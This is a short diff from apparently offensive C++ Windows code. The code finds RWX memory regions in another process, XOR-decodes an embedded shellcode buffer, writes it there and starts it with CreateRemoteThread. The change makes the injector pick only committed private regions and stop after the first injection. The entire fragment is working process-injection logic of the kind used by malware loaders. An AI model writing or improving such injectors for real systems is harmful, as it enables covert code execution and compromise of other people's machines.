@@ -92,12 +92,13 @@ int main()
 					{
 						offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
 
-						if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE)
+						if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
 						{
 							XorByInputKey(shellcode, shellCodeSize, key, sizeof(key));
 							std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
 							WriteProcessMemory(procInfo.handle, mbi.BaseAddress, shellcode, shellCodeSize, &numbersofBytesWritten);
 							CreateRemoteThread(procInfo.handle, NULL, 0, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, 0, NULL);
+							break;
 						}
 					}
 					offset = 0;
